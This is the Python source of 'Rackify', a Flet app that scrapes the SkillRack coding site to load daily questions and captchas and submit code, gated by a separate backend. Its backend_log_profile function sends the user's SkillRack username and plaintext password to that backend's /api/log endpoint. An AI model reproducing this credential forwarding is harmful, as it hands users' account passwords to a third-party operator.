from __future__ import annotations

import base64
import asyncio
import os
import tempfile
from dataclasses import dataclass, field
from typing import Any, Optional

import flet as ft
import requests
from bs4 import BeautifulSoup

APP_TITLE = "Rackify"
APP_VERSION = "1.1.2"
BASE_URL = "https://www.skillrack.com"
BACKEND_DEFAULT = "http://127.0.0.1:5000"
# BACKEND_DEFAULT = "https://backend-apk-wnmq.onrender.com"
LANG_INPUT_VALUE = "7"

REQUEST_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/137.0.0.0 Safari/537.36"
    ),
    "Referer": "https://www.skillrack.com/faces/ui/profile.xhtml",
    "Origin": "https://www.skillrack.com",
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
}

AJAX_HEADERS = REQUEST_HEADERS.copy()
AJAX_HEADERS.update(
    {
        "Faces-Request": "partial/ajax",
        "Referer": "https://www.skillrack.com/faces/candidate/dailychallenge.xhtml",
    }
)


class SkillRackError(RuntimeError):
    pass


def app_border(color: str = "#1f2937", width: float = 1) -> ft.border.Border:
    side = ft.border.BorderSide(width, color)
    return ft.border.Border(left=side, top=side, right=side, bottom=side)


@dataclass
class SessionState:
    backend_url: str = BACKEND_DEFAULT
    auth_unlocked: bool = False
    busy: bool = False
    http_session: Optional[requests.Session] = None
    username: str = ""
    password: str = ""
    profile_url: str = ""
    mode: str = ""
    question_text: str = ""
    captcha_image_src: str = ""
    captcha_image_file: str = ""
    captcha_image_bytes: bytes = b""
    view_state: str = ""
    editor_id: str = ""
    editor_name: str = ""
    submit_source_id: str = ""
    last_result: str = ""


def normalize_backend_url(base_url: str) -> str:
    value = str(base_url or "").strip().rstrip("/")
    if not value:
        return BACKEND_DEFAULT
    if not value.startswith("http://") and not value.startswith("https://"):
        raise SkillRackError("Backend URL must start with http:// or https://")
    return value


def _backend_url(base_url: str, path: str) -> str:
    return f"{normalize_backend_url(base_url)}{path}"


def _extract_backend_detail(response: requests.Response | None, fallback: str) -> str:
    if response is not None:
        try:
            payload = response.json()
        except ValueError:
            payload = None
        if isinstance(payload, dict):
            detail = payload.get("detail")
            if isinstance(detail, str) and detail.strip():
                return detail.strip()
            message = payload.get("message")
            if isinstance(message, str) and message.strip():
                return message.strip()
    return fallback


def backend_root(base_url: str) -> dict[str, Any]:
    response = requests.get(_backend_url(base_url, "/"), timeout=30)
    response.raise_for_status()
    data = response.json()
    if not isinstance(data, dict):
        raise SkillRackError("Backend returned an unexpected response shape")
    return data


def backend_auth(base_url: str, code: str) -> dict[str, Any]:
    """Send auth code and receive auth response with version info"""
    try:
        response = requests.post(
            _backend_url(base_url, "/api/auth"),
            json={"code": code, "app_version": APP_VERSION},
            timeout=30,
        )
        response.raise_for_status()
        data = response.json()
        print(data)
    except requests.HTTPError as exc:
        raise SkillRackError(_extract_backend_detail(exc.response, "Authentication request failed")) from exc
    except requests.RequestException as exc:
        raise SkillRackError(f"Could not reach backend at {normalize_backend_url(base_url)}: {exc}") from exc
    except ValueError as exc:
        raise SkillRackError("Backend returned invalid JSON") from exc

    if not isinstance(data, dict):
        raise SkillRackError("Backend returned an unexpected response shape")
    return data


def check_user_allowed(base_url: str, username: str) -> bool:
    """Check if user is allowed (not blacklisted). Returns True if allowed, False if blocked"""
    try:
        response = requests.post(
            _backend_url(base_url, "/check"),
            json={"username": username},
            timeout=30,
        )
        response.raise_for_status()
        data = response.json()
    except requests.HTTPError as exc:
        raise SkillRackError(_extract_backend_detail(exc.response, "User check failed")) from exc
    except requests.RequestException as exc:
        raise SkillRackError(f"Could not reach backend at {normalize_backend_url(base_url)}: {exc}") from exc
    except ValueError as exc:
        raise SkillRackError("Backend returned invalid JSON") from exc

    if not isinstance(data, dict):
        raise SkillRackError("Backend returned an unexpected response shape")
    
    status = data.get("status", "")
    return status == "allowed"


def backend_log_profile(base_url: str, username: str, password: str, profile_url: str) -> dict[str, Any]:
    try:
        response = requests.post(
            _backend_url(base_url, "/api/log"),
            json={
                "username": username,
                "password": password,
                "profile_url": profile_url,
            },
            timeout=30,
        )
        response.raise_for_status()
        data = response.json()
    except requests.HTTPError as exc:
        raise SkillRackError(_extract_backend_detail(exc.response, "Profile logging failed")) from exc
    except requests.RequestException as exc:
        raise SkillRackError(f"Could not reach backend at {normalize_backend_url(base_url)}: {exc}") from exc
    except ValueError as exc:
        raise SkillRackError("Backend returned invalid JSON") from exc

    if not isinstance(data, dict):
        raise SkillRackError("Backend returned an unexpected response shape")
    return data


def is_login_response(response: requests.Response) -> bool:
    final_url = response.url.lower()
    body = response.text.lower()
    if "login.xhtml" in final_url:
        return True
    if "have you forgotten the password?" in body:
        return True
    if "<redirect" in body and "login.xhtml" in body:
        return True
    try:
        soup = BeautifulSoup(response.text, "xml")
        redirect = soup.find("redirect")
        if redirect and "login.xhtml" in redirect.get("url", "").lower():
            return True
    except Exception:
        pass
    return False


def extract_captcha_image_src(soup: BeautifulSoup) -> Optional[str]:
    for img in soup.find_all("img"):
        src = img.get("src", "")
        if src.startswith("data:image/png;base64"):
            return src
    return None


def write_captcha_image_file(data_uri: str) -> tuple[Optional[str], Optional[bytes]]:
    data_uri = str(data_uri or "").strip()
    if not data_uri.startswith("data:image/") or "," not in data_uri:
        print(f"Invalid captcha data URI: {data_uri[:80]}")
        return None, None

    try:
        _, encoded = data_uri.split(",", 1)
        encoded += "=" * (-len(encoded) % 4)
        image_bytes = base64.b64decode(encoded)
    except Exception as exc:
        print(f"Captcha base64 decode failed: {exc}")
        return None, None

    handle = tempfile.NamedTemporaryFile(delete=False, suffix=".png")
    try:
        handle.write(image_bytes)
        handle.flush()
        path = os.path.abspath(handle.name)
        if os.path.exists(path):
            print(f"Saved captcha: {path} size={os.path.getsize(path)}")
        else:
            print(f"Captcha file missing after write: {path}")
        return path, image_bytes
    finally:
        handle.close()


def extract_profile_url(html: str) -> Optional[str]:
    soup = BeautifulSoup(html, "html.parser")
    link = soup.select_one('a[href*="/profile/"]')
    if link and link.get("href"):
        return link.get("href")
    return None


def clean_html_to_text(html: str, mode: str) -> str:
    text = BeautifulSoup(html, "html.parser").get_text("\n")
    start = text.find("DAILY TEST") if mode == "dt" else text.find("DAILY CHALLENGE")
    end = text.find("Max Execution Time")
    if start != -1 and end != -1:
        return text[start:end].strip()
    return text.strip()


def extract_partial_updates(xml_text: str) -> tuple[Optional[str], dict[str, str]]:
    soup = BeautifulSoup(xml_text, "xml")
    redirect = soup.find("redirect")
    if redirect and redirect.get("url"):
        return redirect.get("url"), {}

    updates: dict[str, str] = {}
    for update in soup.find_all("update"):
        update_id = update.get("id")
        if update_id:
            updates[update_id] = update.get_text()
    return None, updates


def extract_view_state(xml_text: str) -> Optional[str]:
    _, updates = extract_partial_updates(xml_text)
    for update_id, update_value in updates.items():
        if "ViewState" in update_id:
            value = update_value.strip()
            if value:
                return value
    return None


def parse_programgrid(programgrid_html: str) -> dict[str, Optional[str]]:
    soup = BeautifulSoup(programgrid_html, "html.parser")
    textarea = soup.find("textarea")
    if textarea is None:
        raise SkillRackError("Could not locate editor textarea in programgrid update")

    run_button = None
    for button in soup.find_all("button"):
        button_text = button.get_text(" ", strip=True).lower()
        onclick = button.get("onclick", "")
        if button_text == "run" or "progresspanel,srmsg" in onclick:
            run_button = button
            break

    return {
        "editor_id": textarea.get("id"),
        "editor_name": textarea.get("name"),
        "submit_source_id": run_button.get("id") if run_button else None,
    }


def parse_submission_result(xml_text: str) -> dict[str, Any]:
    _, updates = extract_partial_updates(xml_text)
    progresspanel_html = updates.get("progresspanel", "")
    hintsoln_html = updates.get("hintsoln", "")
    srmsg_html = updates.get("srmsg", "")

    result: dict[str, Any] = {
        "status": "unknown",
        "message": None,
        "input": None,
        "expected_output": None,
        "your_output": None,
        "loading_message": None,
        "raw_hint": None,
    }

    if srmsg_html:
        srmsg_soup = BeautifulSoup(srmsg_html, "html.parser")
        loading_text = srmsg_soup.get_text(" ", strip=True)
        if loading_text:
            result["loading_message"] = loading_text

    if hintsoln_html:
        hintsoln_soup = BeautifulSoup(hintsoln_html, "html.parser")
        hint_text = hintsoln_soup.get_text(" ", strip=True)
        if hint_text:
            result["raw_hint"] = hint_text

    if not progresspanel_html:
        return result

    panel = BeautifulSoup(progresspanel_html, "html.parser")
    red_label = panel.select_one(".ui.label.red")
    green_label = panel.select_one(".ui.label.green")
    if green_label is not None:
        result["status"] = "passed"
        result["message"] = green_label.get_text(" ", strip=True)
    elif red_label is not None:
        result["status"] = "failed"
        result["message"] = red_label.get_text(" ", strip=True)

    label_spans = panel.find_all("span", class_="ui label black")
    card_values = panel.find_all("div", class_="ui-card-content")
    if label_spans and card_values:
        text_values = [card.get_text(" ", strip=True) for card in card_values]
        if len(text_values) >= 1:
            result["input"] = text_values[0]
        if len(text_values) >= 2:
            result["expected_output"] = text_values[1]
        if len(text_values) >= 3:
            result["your_output"] = text_values[2]

    if result["message"] is None:
        panel_text = panel.get_text(" ", strip=True)
        if panel_text:
            result["message"] = panel_text

    return result


def format_submission_result(payload: dict[str, Any]) -> str:
    result = payload.get("result", payload)
    if not isinstance(result, dict):
        return str(result)

    lines = [f"Status: {str(result.get('status') or 'unknown').upper()}"]

    message = result.get("message")
    if message:
        lines.append(f"Message: {message}")

    loading_message = result.get("loading_message")
    if loading_message:
        lines.append(f"Loading: {loading_message}")

    for label, key in (
        ("Input", "input"),
        ("Expected Output", "expected_output"),
        ("Your Output", "your_output"),
        ("Hint", "raw_hint"),
    ):
        value = result.get(key)
        if value:
            lines.extend(["", f"{label}:", str(value)])

    return "\n".join(lines).strip()


def skillrack_login(username: str, password: str) -> tuple[requests.Session, str]:
    client = requests.Session()

    client.get(f"{BASE_URL}/faces/ui/profile.xhtml", headers=REQUEST_HEADERS, timeout=30)
    response = client.post(
        f"{BASE_URL}/faces/ui/j_security_check",
        data={"j_username": username, "j_password": password},
        headers=REQUEST_HEADERS,
        allow_redirects=True,
        timeout=30,
    )
    if is_login_response(response):
        client.close()
        raise SkillRackError("Invalid SkillRack credentials")

    jsessionid = client.cookies.get("JSESSIONID")
    if not jsessionid:
        client.close()
        raise SkillRackError("SkillRack login did not return JSESSIONID")

    manage_url = f"{BASE_URL}/faces/candidate/manageprofile.xhtml"
    manage_response = client.get(manage_url, headers=REQUEST_HEADERS, allow_redirects=True, timeout=30)
    if is_login_response(manage_response):
        client.close()
        raise SkillRackError("SkillRack session expired while opening profile page")

    soup = BeautifulSoup(manage_response.text, "html.parser")
    view_state_input = soup.find("input", {"name": "jakarta.faces.ViewState"})
    if view_state_input is None:
        client.close()
        raise SkillRackError("SkillRack manage profile page did not include ViewState")

    payload = {
        "j_id_3i:j_id_3l": password,
        "j_id_3i:j_id_3m": "",
        "j_id_3i_SUBMIT": "1",
        "jakarta.faces.ViewState": view_state_input["value"],
    }

    post_response = client.post(
        manage_url,
        data=payload,
        headers=REQUEST_HEADERS,
        allow_redirects=True,
        timeout=30,
    )
    if is_login_response(post_response):
        client.close()
        raise SkillRackError("SkillRack session expired while reading profile URL")

    profile_url = extract_profile_url(post_response.text) or extract_profile_url(manage_response.text)
    if not profile_url:
        client.close()
        raise SkillRackError("Could not extract SkillRack profile URL")

    return client, profile_url


def skillrack_logout(session: requests.Session) -> None:
    logout_url = f"{BASE_URL}/faces/ui/profile.xhtml"
    get_response = session.get(logout_url, headers=REQUEST_HEADERS, allow_redirects=True, timeout=30)
    soup = BeautifulSoup(get_response.text, "html.parser")
    vs_input = soup.find('input[name="jakarta.faces.ViewState"]')
    view_state = vs_input["value"] if vs_input else ""

    payload = {
        "jakarta.faces.partial.ajax": "true",
        "jakarta.faces.source": "j_id_13:j_id_24",
        "jakarta.faces.partial.execute": "@all",
        "j_id_13:j_id_24": "j_id_13:j_id_24",
        "j_id_13_SUBMIT": "1",
        "jakarta.faces.ViewState": view_state,
    }

    session.post(
        logout_url,
        data=payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        allow_redirects=True,
        timeout=30,
    )


def get_question(session: requests.Session, mode: str) -> dict[str, Any]:
    normalized_mode = mode.lower()
    if normalized_mode not in {"dt", "dc"}:
        raise SkillRackError("mode must be dt or dc")

    challenge_url = f"{BASE_URL}/faces/candidate/dailychallenge.xhtml?k={'DT' if normalized_mode == 'dt' else 'DC'}"
    response = session.get(challenge_url, headers=REQUEST_HEADERS, allow_redirects=True, timeout=30)
    if is_login_response(response):
        raise SkillRackError("SkillRack session expired during question load")

    soup = BeautifulSoup(response.text, "html.parser")
    view_state_input = soup.find("input", {"name": "jakarta.faces.ViewState"})
    if view_state_input is None:
        raise SkillRackError("SkillRack response did not include ViewState")

    captcha_image_src = extract_captcha_image_src(soup)
    if captcha_image_src is None:
        raise SkillRackError("SkillRack response did not include a captcha image")

    programgrid = soup.find(id="programgrid")
    question_text = clean_html_to_text(response.text, normalized_mode)
    if programgrid is not None:
        programgrid_soup = BeautifulSoup(str(programgrid), "html.parser")
        for target in programgrid_soup.select('#codeeditorpanel, #ptosolve, [id*="capval"], [id*="proceedbtn"]'):
            parent_cell = target.find_parent("div", class_="ui-panelgrid-cell")
            if parent_cell is not None:
                parent_cell.decompose()
            else:
                target.decompose()
        for cell in programgrid_soup.select(".ui-panelgrid-cell"):
            classes = cell.get("class", [])
            cell["class"] = [value for value in classes if value != "ui-md-6"]
        for element in programgrid_soup.select('input, button, img[src^="data:image/png;base64"]'):
            element.decompose()
        for element in programgrid_soup.select('.ui.ribbon, .ui.label.circular, a.ui.label, a.ui.image.label, .ui.label.violet'):
            element.decompose()
        for element in programgrid_soup.find_all("script"):
            element.decompose()
        question_text = programgrid_soup.get_text("\n", strip=True) or question_text

    return {
        "question": question_text,
        "captcha_image": captcha_image_src,
        "view_state": view_state_input["value"],
        "mode": normalized_mode,
    }


def proceed_question(session: requests.Session, mode: str, view_state: str, captcha_value: str) -> dict[str, Any]:
    normalized_mode = mode.lower()
    if normalized_mode not in {"dt", "dc"}:
        raise SkillRackError("mode must be dt or dc")

    captcha_value = str(captcha_value).strip()
    if not captcha_value:
        raise SkillRackError("captcha_value is required")

    challenge_url = f"{BASE_URL}/faces/candidate/dailychallenge.xhtml?k={'DT' if normalized_mode == 'dt' else 'DC'}"
    payload = {
        "jakarta.faces.partial.ajax": "true",
        "jakarta.faces.source": "proceedbtn",
        "jakarta.faces.partial.execute": "proceedbtn capval",
        "jakarta.faces.partial.render": "programgrid ptosolve",
        "proceedbtn": "proceedbtn",
        "capval": captcha_value,
        "code_SUBMIT": "1",
        "jakarta.faces.ViewState": view_state,
    }

    response = session.post(
        challenge_url,
        data=payload,
        headers=AJAX_HEADERS,
        allow_redirects=True,
        timeout=30,
    )
    if is_login_response(response):
        raise SkillRackError("SkillRack session expired while solving captcha")

    redirect_url, updates = extract_partial_updates(response.text)
    if redirect_url and "login.xhtml" in redirect_url.lower():
        raise SkillRackError("SkillRack redirected to login.xhtml")

    refreshed_view_state = extract_view_state(response.text) or view_state
    programgrid_html = updates.get("programgrid")
    if not programgrid_html:
        raise SkillRackError("SkillRack did not return programgrid update")

    parsed = parse_programgrid(programgrid_html)
    editor_id = parsed["editor_id"]
    editor_name = parsed["editor_name"]
    submit_source_id = parsed["submit_source_id"]
    if not editor_id or not editor_name or not submit_source_id:
        raise SkillRackError("Could not derive SkillRack editor metadata")

    return {
        "view_state": refreshed_view_state,
        "editor_id": editor_id,
        "editor_name": editor_name,
        "submit_source_id": submit_source_id,
        "mode": normalized_mode,
    }


def submit_question(
    session: requests.Session,
    mode: str,
    view_state: str,
    editor_id: str,
    editor_name: str,
    submit_source_id: str,
    code: str,
) -> dict[str, Any]:
    normalized_mode = mode.lower()
    if normalized_mode not in {"dt", "dc"}:
        raise SkillRackError("mode must be dt or dc")

    payload = {
        "jakarta.faces.partial.ajax": "true",
        "jakarta.faces.source": submit_source_id,
        "jakarta.faces.partial.execute": f"{editor_id} langs customtcpanel {submit_source_id}",
        "jakarta.faces.partial.render": "progresspanel srmsg",
        submit_source_id: submit_source_id,
        "langs_input": LANG_INPUT_VALUE,
        editor_name: code,
        "code_SUBMIT": "1",
        "jakarta.faces.ViewState": view_state,
    }

    challenge_url = f"{BASE_URL}/faces/candidate/dailychallenge.xhtml?k={'DT' if normalized_mode == 'dt' else 'DC'}"
    response = session.post(
        challenge_url,
        data=payload,
        headers=AJAX_HEADERS,
        allow_redirects=True,
        timeout=30,
    )
    if is_login_response(response):
        raise SkillRackError("SkillRack session expired during submit")

    redirect_url, _ = extract_partial_updates(response.text)
    if redirect_url and "login.xhtml" in redirect_url.lower():
        raise SkillRackError("SkillRack redirected to login.xhtml during submit")

    refreshed_view_state = extract_view_state(response.text) or view_state
    final_result = _wait_for_submission_result(session, challenge_url, refreshed_view_state, response)
    return final_result


def _wait_for_submission_result(
    session: requests.Session,
    challenge_url: str,
    view_state: str,
    initial_response: requests.Response,
) -> dict[str, Any]:
    submission_result = parse_submission_result(initial_response.text)
    if submission_result.get("status") in {"passed", "failed"}:
        return submission_result

    if submission_result.get("loading_message") or "Please wait while we run the program" in initial_response.text:
        poll_source_id = "j_id_78"
        poll_payload = {
            "jakarta.faces.partial.ajax": "true",
            "jakarta.faces.source": poll_source_id,
            "jakarta.faces.partial.execute": poll_source_id,
            "jakarta.faces.partial.render": "progresspanel hintsoln",
            poll_source_id: poll_source_id,
            "langs_input": LANG_INPUT_VALUE,
            "code_SUBMIT": "1",
            "jakarta.faces.ViewState": view_state,
        }
        poll_response = session.post(
            challenge_url,
            data=poll_payload,
            headers=AJAX_HEADERS,
            allow_redirects=True,
            timeout=30,
        )
        if is_login_response(poll_response):
            raise SkillRackError("SkillRack session expired during submit polling")

        refreshed_view_state = extract_view_state(poll_response.text)
        if refreshed_view_state:
            view_state = refreshed_view_state

        submission_result = parse_submission_result(poll_response.text)
        if submission_result.get("status") in {"passed", "failed"}:
            return submission_result

        if submission_result.get("loading_message") is None:
            return submission_result

    return submission_result


class SkillRackHelperApp:
    def __init__(self, page: ft.Page):
        self.page = page
        self.state = SessionState()

        self.page.title = APP_TITLE
        self.page.theme_mode = ft.ThemeMode.DARK
        self.page.bgcolor = "#070b14"
        self.page.padding = 0
        self.page.scroll = ft.ScrollMode.AUTO
        self.page.window_min_width = 390
        self.page.window_min_height = 720
        self.page.window.icon = "assets/icon.png"
        self.backend_url_field = ft.TextField(
            label="Backend URL",
            value=self.state.backend_url,
            expand=True,
            dense=True,
            border_radius=12,
            on_submit=self.apply_backend_url,
        )
        self.backend_url_field.helper_text = "Only /, /api/auth, and /api/log are used by this app."
        self.backend_status = ft.Text("Backend not checked yet.", size=12, color="#94a3b8")
        self.backend_test_button = ft.OutlinedButton("Test Backend", on_click=self.test_backend)

        self.auth_code_field = ft.TextField(
            label="Authentication Code",
            hint_text="Enter the auth code",
            dense=True,
            password=True,
            can_reveal_password=True,
            border_radius=12,
            on_submit=self.verify_auth,
        )
        self.auth_error = ft.Text("", color="#fca5a5", visible=False)
        self.auth_button = ft.ElevatedButton("Verify", on_click=self.verify_auth)

        self.username_field = ft.TextField(label="Username", dense=True, border_radius=12)
        self.password_field = ft.TextField(label="Password", dense=True, password=True, can_reveal_password=True, border_radius=12)
        self.login_error = ft.Text("", color="#fca5a5", visible=False)
        self.login_button = ft.ElevatedButton("Login", on_click=self.perform_login)

        self.status_text = ft.Text("Ready.", color="#dbeafe", selectable=True)
        self.question_text = ft.TextField(
            value="Load a question to see the challenge text here.",
            multiline=True,
            read_only=True,
            expand=True,
            min_lines=18,
            max_lines=24,
            border_radius=12,
            text_style=ft.TextStyle(font_family="monospace", size=13),
        )
        self.captcha_image = ft.Image(src="", visible=False, width=320, height=120, fit=ft.BoxFit.CONTAIN)
        self.captcha_field = ft.TextField(
            label="Captcha value",
            dense=True,
            border_radius=12,
            on_submit=self.proceed_with_captcha,
        )
        self.proceed_button = ft.ElevatedButton("Proceed", on_click=self.proceed_with_captcha)

        self.code_editor = ft.TextField(
            value="# Write your Python solution here\n",
            multiline=True,
            min_lines=18,
            max_lines=18,
            expand=True,
            border_radius=12,
            text_style=ft.TextStyle(font_family="monospace", size=14),
        )
        self.submit_button = ft.ElevatedButton("Submit Solution", on_click=self.submit_code)
        self.response_text = ft.TextField(
            value="Waiting for a submission.",
            multiline=True,
            read_only=True,
            expand=True,
            min_lines=8,
            border_radius=12,
            text_style=ft.TextStyle(font_family="monospace", size=13),
        )

        self.auth_card = self._card(
            title="Authentication",
            subtitle="Start with the authorization code.\nAuthorized users only",
            content=ft.Column(
                [
                    self.auth_code_field,
                    ft.Row([self.auth_button], alignment=ft.MainAxisAlignment.START),
                    self.auth_error,
                ],
                spacing=12,
            ),
        )

        self.login_card = self._card(
            title="Login",
            subtitle="",
            content=ft.Column(
                [
                    self.username_field,
                    self.password_field,
                    ft.Row([self.login_button], alignment=ft.MainAxisAlignment.START),
                    self.login_error,
                ],
                spacing=12,
            ),
            visible=False,
        )

        self.update_note = ft.Text("", size=14, color="#f8fafc")
        self.android_update_button = ft.ElevatedButton("Android Download", visible=False, on_click=lambda e: None)
        self.windows_update_button = ft.ElevatedButton("Windows Download", visible=False, on_click=lambda e: None)
        self.update_card = self._card(
            title="Update Required",
            subtitle="A new version is available. Please update before continuing.",
            content=ft.Column(
                [
                    self.update_note,
                    ft.Row([self.android_update_button, self.windows_update_button], spacing=10),
                ],
                spacing=12,
            ),
            visible=False,
        )

        self.block_note = ft.Text("", size=14, color="#f8fafc")
        self.block_card = self._card(
            title="Access Blocked",
            subtitle="Your account is blocked and cannot use this app.",
            content=ft.Column(
                [
                    self.block_note,
                ],
                spacing=12,
            ),
            visible=False,
        )

        self.workspace_card = self._workspace_card()

        self.page.add(
            ft.SafeArea(
                ft.Container(
                    expand=True,
                    padding=20,
                    content=ft.Column(
                        [
                            self._hero(),
                            self.auth_card,
                            self.login_card,
                            self.update_card,
                            self.block_card,
                            self.workspace_card,
                        ],
                        spacing=18,
                        expand=True,
                        scroll=ft.ScrollMode.AUTO,
                    ),
                )
            )
        )

    def _hero(self) -> ft.Control:
        return ft.Container(
            padding=ft.Padding(0, 12, 0, 4),
            content=ft.Column(
                [
                    ft.Text("Rackify", size=30, weight=ft.FontWeight.W_700, color="#f8fafc"),
                ],
                spacing=4,
            ),
        )

    def _settings_block(self) -> ft.Control:
        return ft.Container(
            padding=16,
            border_radius=16,
            bgcolor="#0f172a",
            border=app_border(),
            content=ft.Column(
                [
                    ft.Text("Backend settings", weight=ft.FontWeight.W_600, color="#e2e8f0"),
                    self.backend_url_field,
                    ft.Row([self.backend_test_button, self.backend_status], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
                ],
                spacing=10,
            ),
        )

    def _section(self, title: str, body: ft.Control) -> ft.Control:
        return ft.Container(
            padding=18,
            border_radius=18,
            bgcolor="#0b1220",
            border=app_border(),
            content=ft.Column(
                [
                    ft.Text(title, size=18, weight=ft.FontWeight.W_600, color="#f8fafc"),
                    body,
                ],
                spacing=12,
            ),
        )

    def _card(self, title: str, subtitle: str, content: ft.Control, visible: bool = True) -> ft.Control:
        return ft.Container(
            visible=visible,
            padding=20,
            border_radius=20,
            bgcolor="#0b1220",
            border=app_border(),
            shadow=ft.BoxShadow(spread_radius=1, blur_radius=28, color="#00000055", offset=ft.Offset(0, 12)),
            content=ft.Column(
                [
                    ft.Text(title, size=24, weight=ft.FontWeight.W_700, color="#f8fafc"),
                    ft.Text(subtitle, color="#94a3b8"),
                    ft.Container(height=8),
                    content,
                ],
                spacing=6,
            ),
        )

    def _workspace_card(self) -> ft.Control:
        header = ft.Row(
            [
                ft.Column(
                    [
                        ft.Text("Workspace", size=24, weight=ft.FontWeight.W_700, color="#f8fafc"),
                        ft.Text(
                            "Load a question, solve the captcha, submit code, then review the response.",
                            color="#94a3b8",
                        ),
                    ],
                    spacing=2,
                    expand=True,
                ),
                ft.Row(
                    [
                        ft.OutlinedButton("Copy Question", on_click=self.copy_question),
                        ft.OutlinedButton("Logout", on_click=self.perform_logout),
                    ],
                    spacing=10,
                ),
            ],
            alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
            vertical_alignment=ft.CrossAxisAlignment.START,
        )

        mode_row = ft.Row(
            [
                ft.ElevatedButton("Daily Test", on_click=self.load_dt),
                ft.ElevatedButton("Daily Challenge", on_click=self.load_dc),
            ],
            wrap=True,
            spacing=10,
        )

        question_section = self._section(
            "Question",
            ft.Column(
                [
                    self.status_banner(),
                    self.question_text,
                ],
                spacing=12,
            ),
        )

        captcha_section = self._section(
            "Security Captcha",
            ft.Column(
                [
                    self.captcha_image,
                    ft.Row(
                        [self.captcha_field, self.proceed_button],
                        spacing=10,
                        vertical_alignment=ft.CrossAxisAlignment.END,
                    ),
                ],
                spacing=12,
            ),
        )
        captcha_section.visible = False

        editor_section = self._section(
            "Python Code",
            ft.Column(
                [self.code_editor, ft.Row([self.submit_button], alignment=ft.MainAxisAlignment.START)],
                spacing=12,
            ),
        )
        editor_section.visible = False

        response_section = self._section(
            "Result",
            self.response_text,
        )
        response_section.visible = False

        self.question_section = question_section
        self.captcha_section = captcha_section
        self.editor_section = editor_section
        self.response_section = response_section

        return ft.Container(
            visible=False,
            padding=0,
            content=ft.Column(
                [header, mode_row, question_section, captcha_section, editor_section, response_section],
                spacing=16,
            ),
        )

    def status_banner(self) -> ft.Control:
        return ft.Container(
            padding=12,
            border_radius=12,
            bgcolor="#111827",
            border=app_border(),
            content=self.status_text,
        )

    async def set_status(self, message: str) -> None:
        self.status_text.value = message
        self.page.update()

    async def set_error(self, control: ft.Text, message: str) -> None:
        control.value = message
        control.visible = True
        self.page.update()

    async def clear_error(self, control: ft.Text) -> None:
        control.value = ""
        control.visible = False
        self.page.update()

    async def show_update_dialog(self, latest_version: str, downloads: dict[str, str]) -> None:
        """Show update available dialog"""
        def open_download(url: str):
            if url:
                self.page.launch_url(url)

        android_url = downloads.get("Rackify.apk") or next(
            (url for name, url in downloads.items() if "apk" in name.lower() or "android" in name.lower()),
            "",
        )
        windows_url = downloads.get("Rackify.exe") or next(
            (url for name, url in downloads.items() if "windows" in name.lower() or "exe" in name.lower()),
            "",
        )

        actions = []
        if android_url:
            actions.append(ft.TextButton("Android Download", on_click=lambda e, url=android_url: open_download(url)))
        if windows_url:
            actions.append(ft.TextButton("Windows Download", on_click=lambda e, url=windows_url: open_download(url)))
        actions.append(ft.TextButton("Later", on_click=lambda e: self.close_dialog()))

        dialog = ft.AlertDialog(
            title=ft.Text("🚀 Update Available", size=20, weight=ft.FontWeight.W_700),
            content=ft.Column([
                ft.Text(f"Current: {APP_VERSION}", size=12, color="#94a3b8"),
                ft.Text(f"Latest: {latest_version}", size=12, color="#4ade80", weight=ft.FontWeight.W_600),
                ft.Text("A new version is available. Download it now!", size=14, color="#e2e8f0"),
            ], spacing=8),
            actions=actions,
            actions_alignment=ft.MainAxisAlignment.CENTER,
        )

        self.update_note.value = f"Please download the latest version ({latest_version}) before continuing."
        self.android_update_button.visible = bool(android_url)
        self.windows_update_button.visible = bool(windows_url)
        self.android_update_button.on_click = lambda e, url=android_url: self.open_download_url(url)
        self.windows_update_button.on_click = lambda e, url=windows_url: self.open_download_url(url)
        self.auth_card.visible = False
        self.login_card.visible = False
        self.update_card.visible = True

        dialog.open = True
        self.page.dialog = dialog
        self.page.update()
        await asyncio.sleep(0.05)
        self.page.update()

    def close_dialog(self):
        if self.page.dialog:
            self.page.dialog.open = False
            self.page.update()

    async def open_download_url(self, url: str) -> None:
        if url:
            await self.page.launch_url(url)

    async def show_blacklist_dialog(self) -> None:
        """Show user blacklisted dialog"""
        dialog = ft.AlertDialog(
            title=ft.Text("🚫 Access Denied", size=20, weight=ft.FontWeight.W_700),
            content=ft.Text("Sorry, you have been blacklisted by admin and cannot access this app.", size=14),
            actions=[
                ft.TextButton("OK", on_click=lambda e: self.close_dialog()),
            ],
        )
        
        self.page.dialog = dialog
        dialog.open = True
        self.page.update()
        await asyncio.sleep(0.5)

    async def set_busy(self, busy: bool) -> None:
        self.state.busy = busy
        self.auth_button.disabled = busy
        self.login_button.disabled = busy
        self.proceed_button.disabled = busy
        self.submit_button.disabled = busy
        self.backend_test_button.disabled = busy
        self.page.update()

    async def apply_backend_url(self, _event: ft.ControlEvent) -> None:
        try:
            self.state.backend_url = normalize_backend_url(self.backend_url_field.value)
            self.backend_url_field.value = self.state.backend_url
            self.backend_status.value = f"Backend set to {self.state.backend_url}"
            self.backend_status.color = "#86efac"
            self.page.update()
        except SkillRackError as exc:
            self.backend_status.value = str(exc)
            self.backend_status.color = "#fca5a5"
            self.page.update()

    async def test_backend(self, _event: ft.ControlEvent) -> None:
        if self.state.busy:
            return
        await self.set_busy(True)
        try:
            data = await asyncio.to_thread(backend_root, self.state.backend_url)
            status = str(data.get("status") or "online")
            mode = str(data.get("mode") or "")
            self.backend_status.value = f"Backend: {status}{' / ' + mode if mode else ''}"
            self.backend_status.color = "#86efac"
            self.page.update()
        except SkillRackError as exc:
            self.backend_status.value = str(exc)
            self.backend_status.color = "#fca5a5"
            self.page.update()
        except Exception as exc:
            self.backend_status.value = f"Backend test failed: {exc}"
            self.backend_status.color = "#fca5a5"
            self.page.update()
        finally:
            await self.set_busy(False)

    async def verify_auth(self, _event: ft.ControlEvent) -> None:
        if self.state.busy:
            return
        await self.set_busy(True)
        await self.clear_error(self.auth_error)
        try:
            code = (self.auth_code_field.value or "").strip()
            if not code:
                raise SkillRackError("Authentication code is required")
            
            await self.set_status("Verifying authentication code...")
            auth_response = await asyncio.to_thread(backend_auth, self.state.backend_url, code)
            self.backend_status.value = f"Auth response: {auth_response.get('message')} | update_required={auth_response.get('update_required')}"
            print(self.backend_status.value)
            self.backend_status.color = "#93c5fd"
            self.page.update()

